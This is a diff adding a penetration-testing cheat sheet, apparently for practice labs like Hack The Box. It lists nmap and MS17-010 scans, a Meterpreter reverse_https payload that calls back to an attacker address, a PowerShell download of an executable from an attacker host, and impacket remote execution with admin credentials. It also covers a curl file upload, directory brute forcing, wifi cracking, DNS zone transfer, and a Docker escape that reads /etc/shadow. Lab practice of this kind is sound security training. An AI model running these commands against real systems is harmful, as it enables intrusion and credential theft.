@@ -1,0 +1,88 @@
+nmap
+nmap
+nmap -sV --script=http-enum 10.10.10.75
+nmap -sL 10.10.10.75 --> 
+nmap -a 10.10.10.75 --> intrusive scan
+nmap -sS 10.10.10.75 --> TCP
+
+nmap -p 9255,9256 -sC -sV -oA nmap/targeted 10.10.10.74
+nmap -p 9255,9256 -sC -sV -n -Pn -T5 10.10.10.74
+nmap -p 9255,9256 --script vuln -T5 10.10.10.74
+MS17-010 nmap scan
+nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010 10.1.29.0/24
+==============================================================
+Base 64 Encode/Decode
+Base 64 decode
+echo QWxhZGRpbjpvcGVuIHNlc2FtZQ== | base64 --decode
+
+Openssl
+$ openssl enc -base64 <<< 'Hello, World!'
+SGVsbG8sIFdvcmxkIQo=
+$ openssl enc -base64 -d <<< SGVsbG8sIFdvcmxkIQo=
+Hello, World!
+
+Python
+>>> import base64
+>>> data = base64.b64decode('')
+==============================================================
+Exploitation
+
+searchsploit -m exploits/windows/remote/36025.py
+
+python unicorn.py windows/meterpreter/reverse_https 10.10.14.30 9001
+
+Meterpreter -> Powershell
+load powershell
+powershell_shell
+==============================================================
+Windows
+
+PowerShell (New-Object System.Net.WebClient).DownloadFile('http://10.10.15.135:8000/cat.exe','cat.exe');
+
+windows exploitation
+impacket-wmiexec 'administrator:Welcome1!@localhost' cmd
+
+psexec.py 'administrator:Welcome1!@127.0.0.1' cmd
+==============================================================
+File System
+
+file transfer from remote system
+scp username@remote:/file/to/send /where/to/put
+
+Python file read
+f = open('/root/root.txt','r')
+message = f.read()
+print(message)
+f.close()
+
+File upload
+curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS
+==============================================================
+Directory BruteForce
+
+dirb http://10.10.10.73 -X .php
+dirbuster
+
+gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.73
+==============================================================
+Xdebug check
+curl 'http://10.10.10.83/index.php?XDEBUG_SESSION_START=phpstrom' -H 'X-Forwarded-For: 10.10.14.76'
+=======================================================================
+wifi password cracking
+
+aircrack-ng -w rockyou.txt captured.cap
+
+=======================================================================
+DNS Zone transfer
+
+dnsrecon -d domain.com
+dig 10.10.10.10 domain.com. axfr
+=======================================================================
+Port Knocking
+knock 10.10.10.83 3456 8234 62431
+=======================================================================
+Privilege Escalation
+
+Docker
+docker run -v /etc:/root container_name cat /root/shadow
+=======================================================================
